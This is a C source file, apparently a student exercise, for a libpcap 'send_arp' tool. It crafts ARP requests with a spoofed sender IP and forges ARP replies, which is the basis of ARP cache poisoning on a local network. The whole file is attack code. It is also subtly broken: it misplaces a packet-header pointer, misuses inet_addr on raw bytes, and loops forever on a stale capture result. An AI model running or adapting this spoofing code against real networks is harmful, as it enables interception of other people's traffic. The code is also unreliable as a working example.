#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <unistd.h>

typedef struct ether_header{
	uint8_t DesMac[6];
	uint8_t SrcMac[6];
	uint16_t Type;
}ether_header;



typedef struct my_arp
{
	uint16_t my_hwt;
	uint16_t my_pro;
	uint8_t my_hwln;
	uint8_t my_proln;
	uint16_t my_op;
	u_int8_t my_shwa[6];
	uint8_t my_si[4];
	u_int8_t my_thwa[6];
	uint8_t my_ti[4];
	
}my_arp;





int rqarp(pcap_t* handle,char* dev,uint8_t*si,uint8_t*ti);
int arprp(pcap_t*handle,ether_header*eth,my_arp*mya);


void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp ens33\n");
};

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
		
		
		struct pcap_pkthdr* header;
		const u_char* packet;
		rqarp(handle,dev,argv[2],argv[3]);
		int res = pcap_next_ex(handle, &header, &packet);
		while(1){
			
			if (res == 0) continue;
			if (res == -1 || res == -2) break;
			ether_header*eth1=(ether_header*)packet;
			if(ntohs(eth1->Type)==0x0806){
				my_arp * mya=(my_arp*)(packet+sizeof(ether_header));
				if(ntohs(mya->my_op)==2 && *(uint32_t*)mya->my_si==inet_addr(argv[2])){
					puts("haahh");
					sleep(2);
					arprp(handle,eth1,mya);
					
				}
			}
		}
		

	//while (1) {}
		
	

	pcap_close(handle);
	return 0;
}

int arprp(pcap_t*handle,ether_header*eth,my_arp*mya){

	
	uint8_t buf[50]={0,};

		ether_header*eth1=(ether_header*)buf;
		memcpy(eth1->DesMac,eth->DesMac ,6);
		memcpy(eth1->SrcMac,eth->SrcMac,6);
		eth1->Type=ntohs(0x0806);
		my_arp * mya1=(my_arp*)buf+sizeof(ether_header);
		mya1->my_hwt=htons(1);
		mya1->my_pro=htons(0x0800);
		mya1->my_hwln=6;
		mya1->my_proln=4;
		mya1->my_op=ntohs(2);
		memcpy(mya1->my_shwa, eth->SrcMac,6);
		*(uint32_t*)mya1->my_si=(inet_addr(mya->my_si));
		memcpy(mya1->my_thwa, eth->DesMac,6);
		*(uint32_t*)mya1->my_ti=(inet_addr(mya->my_ti));
		pcap_sendpacket(handle,buf,sizeof(ether_header)+sizeof(my_arp));
		puts("arp reqly done");


}
int rqarp(pcap_t* handle,char* dev,uint8_t*si,uint8_t*ti){
	struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	uint8_t buf[50]={0,};
    strcpy(s.ifr_name, dev);
    if ( ioctl(fd, SIOCGIFHWADDR, &s)==0) {
		
		ether_header*eth1=(ether_header*)buf;
		memcpy(eth1->DesMac, "\xff\xff\xff\xff\xff\xff",6);
		memcpy(eth1->SrcMac, s.ifr_addr.sa_data,6);
		eth1->Type=ntohs(0x0806);
		my_arp * mya=(my_arp*)(buf+sizeof(ether_header));
		mya->my_hwt=htons(1);
		mya->my_pro=htons(0x0800);
		mya->my_hwln=6;
		mya->my_proln=4;
		mya->my_op=ntohs(1);
		memcpy(mya->my_shwa, s.ifr_addr.sa_data,6);
		*(uint32_t*)mya->my_si=(inet_addr(ti));
		memcpy(mya->my_thwa, "\x00\x00\x00\x00\x00\x00",6);
		*(uint32_t*)mya->my_ti=(inet_addr(si));
		pcap_sendpacket(handle,buf,sizeof(ether_header)+sizeof(my_arp));
		puts("arp request done");
	}
}

	// "\xff\xff\xff\xff\xff\xff
	// \x38\x00\x25\x56\x59\x8c\x08\x06\x00\x01" \
	// "\x08\x00\x06\x04\x00\x01\x38\x00\x25\x56\x59\x8c\xc0\xa8\xdb\x6d" \
	// "\x00\x00\x00\x00\x00\x00\xc0\xa8\xdb\x01"







